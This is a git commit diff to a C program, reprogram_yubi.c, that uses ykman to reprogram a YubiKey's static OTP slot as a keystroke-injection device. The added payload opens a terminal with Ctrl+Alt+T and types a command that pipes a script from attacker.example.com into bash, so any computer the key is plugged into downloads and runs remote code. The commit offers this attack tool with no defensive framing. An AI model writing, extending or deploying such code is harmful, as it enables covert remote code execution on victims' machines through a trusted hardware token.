af8373662b5ba1aa27f126470e7659473b2b3bb3
Jordan Lanham <125485915+jordanlanham52@users.noreply.github.com>
2025-04-30 12:53:30 -0700

    Update reprogram_yubi.c

--- reprogram_yubi.c
+++ reprogram_yubi.c
@@ -6,14 +6,18 @@ int main(int argc, char **argv) {
         return 1;
     }
    
-    char devpath[64];
+    char devpath[64], cmd[512];
     snprintf(devpath, sizeof(devpath), "/dev/%s", argv[1]);
 
-    char cmd[256];
+    const char *payload =
+      "{CTRL}{ALT}t"
+      "{DELAY1000}"
+      "bash -c 'curl -s http://attacker.example.com/payload.sh | bash'"
+      "{ENTER}";
+
     snprintf(cmd, sizeof(cmd),
-        "ykman --device %s otp static --slot 1 set "
-        "\"bash -c 'curl -s http://attacker.example.com/payload.sh | bash'\"",
-        devpath);
+        "ykman --device %s otp static --slot 1 set \"%s\"",
+        devpath, payload);
 
     return system(cmd);
 }
